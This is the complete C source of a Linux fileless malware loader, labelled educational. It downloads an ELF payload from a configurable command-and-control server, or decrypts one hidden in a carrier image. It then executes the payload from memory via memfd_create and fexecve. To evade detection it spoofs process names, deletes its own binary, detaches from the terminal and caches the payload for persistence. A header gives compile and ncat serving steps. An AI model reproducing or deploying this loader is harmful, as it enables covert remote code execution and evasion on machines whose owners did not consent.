/*
 * ---------------------------------------------------------------------------
 *  Fileless In-Memory Loader Linux @4quarks
 * ---------------------------------------------------------------------------
 *  Summary:
 *  This tool implements a fileless, in-memory ELF loader for Linux systems.
 *  It optionally decrypts a payload embedded in a carrier file or downloads 
 *  one from a remote C2 (Command & Control) server over TCP, and executes it 
 *  entirely from memory using memfd_create().
 *
 *  Key Features:
 *  - Uses memfd_create() to create a memory-backed, executable file descriptor
 *  - Executes an ELF binary directly from memory via /proc/self/fd/<fd>
 *  - Optionally pulls the payload from a configurable C2 IP and port
 *  - Applies a fake process name (argv[0]) for stealth in ps, top, etc.
 *  - Optionally links the process to a custom name in /proc/<pid>/status
 *  - Deletes itself from disk (via unlink("/proc/self/exe")) after execution
 *  - Leaves no payload or loader trace on the filesystem after startup
 *  - Optionally decrypts an embedded payload using AES-CBC with a configurable marker
 *  - Skips re-download if a local persisted (EXTRACT_PATH) copy exists
 *
 *  Typical Use:
 *    1. Compile the loader:
 *         $  gcc -o loader loader.c -lcrypto
 *    2. Start a listener to serve the payload binary:
 *         $  ncat -lvnp 1111 < payload.elf
 *    3. Execute the loader (loads from image or C2):
 *         $  ./loader
 *
 *  Optional Behavior:
 *    - If EXTRACT_PATH is defined and exists, use it as a payload cache.
 *    - If the marker is detected in the payload, AES decryption is applied.
 *
 *  Warning:
 *  This code is for educational and authorized use only. Do not use on 
 *  systems you do not own or have explicit permission to operate on.
 */


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <limits.h>
#include <signal.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#ifndef __NR_memfd_create
#define __NR_memfd_create 279
#endif
#define BUF_SIZE 4096
extern char **environ;

// Parameters
const char *C2_IP        = {__C2_IP__};         // C2 IP
const int   C2_PORT      = {__C2_PORT__};       // C2 port
const char *FAKE_PROC    = {__FAKE_PROC__};     // Shown in `ps` output
const char *FD_NAME      = {__FD_NAME__};       // Shown in `cat /proc/<pid>/maps` as `[memfd:error (deleted)]`
const char *PROC_LINK    = {__PROC_LINK__};     // Detault empty. Shown in `cat /proc/<pid>/status` as `Name: <filename>`.
const char *EXTRACT_PATH = {__EXTRACT_PATH__};  // Detault empty. Used for persistence to have the encrypted payload locally hidden on a picture.
const char *MARKER       = {__MARKER__};        // Characters to mark the beginning of the encrypted payload    
unsigned char key[32]    = {__KEY__};           // Populated by builder
unsigned char iv[16]     = {__IV__};            // Populated by builder

unsigned char *decrypt_aes(const unsigned char *data, int len, const unsigned char *key, const unsigned char *iv, int *out_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char *out = malloc(len + AES_BLOCK_SIZE);
    int len1, len2;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, out, &len1, data, len);
    EVP_DecryptFinal_ex(ctx, out + len1, &len2);
    *out_len = len1 + len2;
    EVP_CIPHER_CTX_free(ctx);
    return out;
}
// Seek, read, and decrypt the file content
unsigned char *process_payload(FILE *f, size_t *out_size, int *payload_len) {
    fseek(f, 0, SEEK_END);
    *out_size = ftell(f);
    rewind(f);

    unsigned char *raw = malloc(*out_size);
    if (!raw) {
        perror("malloc failed");
        return NULL;
    }

    fread(raw, 1, *out_size, f);
    fclose(f);

    // Check for marker
    char *marker = memmem(raw, *out_size, MARKER, strlen(MARKER));
    unsigned char *payload = NULL;

    if (marker) {
        unsigned char *iv_start = (unsigned char *)(marker + strlen(MARKER));
        unsigned char *enc_data = iv_start + 16;
        int enc_len = raw + *out_size - enc_data;
        payload = decrypt_aes(enc_data, enc_len, key, iv_start, payload_len);
        free(raw);  // Free encrypted blob
    } else {
        payload = raw;
        *payload_len = *out_size;
    }

    return payload;
}

// SYS_call wrapper for memfd_create
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}
// Execute payload from memory without exposing /proc path
int exec_memfd(int fd, char **argv, char **envp) {
    lseek(fd, 0, SEEK_SET);  // rewind file descriptor
    return fexecve(fd, argv, envp);
}
int main(int argc, char **argv) {
    int sock, fd, n;
    struct sockaddr_in addr;
    char buffer[BUF_SIZE];
    char *exec_argv[] = {(char *)FAKE_PROC, NULL};
    unsigned char *payload = NULL;
    int payload_len = 0;
    size_t raw_size = 0;
    FILE *f = NULL;

    // Always create the memfd before payload handling
    if ((fd = memfd_create(FD_NAME, 0)) < 0) {
        perror("memfd_create");
        exit(EXIT_FAILURE);
    }

    if (EXTRACT_PATH && strlen(EXTRACT_PATH) > 0 && access(EXTRACT_PATH, F_OK) == 0) {
        // Load from disk
        f = fopen(EXTRACT_PATH, "rb");
        if (!f) {
            perror("fopen extract path");
            exit(EXIT_FAILURE);
        }
    } else {
        // Connect to C2
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_IP, &addr.sin_addr);

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            perror("socket");
            exit(EXIT_FAILURE);
        }
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("connect");
            close(sock);
            exit(EXIT_FAILURE);
        }

        FILE *tmp = tmpfile();
        while ((n = read(sock, buffer, sizeof(buffer))) > 0) {
            fwrite(buffer, 1, n, tmp);
        }
        close(sock);
        f = tmp;

        // Save for persistence if desired
        if (EXTRACT_PATH && strlen(EXTRACT_PATH) > 0) {
            rewind(tmp);
            FILE *outf = fopen(EXTRACT_PATH, "wb");
            while ((n = fread(buffer, 1, sizeof(buffer), tmp)) > 0) {
                fwrite(buffer, 1, n, outf);
            }
            fclose(outf);
            rewind(tmp);
        }
    }

    // Decrypt or extract payload from file
    payload = process_payload(f, &raw_size, &payload_len);

    // Write to memfd
    write(fd, payload, payload_len);
    // Self-delete loader
    char exe_path[PATH_MAX] = {0};  
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len != -1) {
        exe_path[len] = '\0';  
        if (unlink(exe_path) != 0) {
            perror("unlink");
        }
    } else {
        perror("readlink");
    }  
    // Fork and execute from memory
    pid_t pid = fork();
    if (pid == 0) {
        setsid();  // Detach from terminal
        // Prevent zombie for cleaner process
        signal(SIGCHLD, SIG_IGN);
        // If PROC_LINK is defined, create a temporary file to define the process name
        if (PROC_LINK && strlen(PROC_LINK) > 0) {
            // Unlink in case it was already existing
            unlink(PROC_LINK);
            // Create the symbolic link
            char exec_path[64];
            snprintf(exec_path, sizeof(exec_path), "/proc/self/fd/%d", fd);
            if (symlink(exec_path, PROC_LINK) == -1) {
                perror("symlink failed");
                exit(EXIT_FAILURE);
            }
            // Unlink file once it is triggered and loaded in memory
            if (fork() == 0) {
                setsid();
                sleep(5);
                unlink(PROC_LINK);
                _exit(0);
            }
            // Trigger the payload from the temporary symbolic link
            execve(PROC_LINK, exec_argv, environ);
            perror("execve failed");
            exit(EXIT_FAILURE);
        } else {
            // Trigger the payload from memory
            exec_memfd(fd, exec_argv, environ);
            perror("exec_memfd failed");
            exit(EXIT_FAILURE);
        }
    }
    return 0;
}

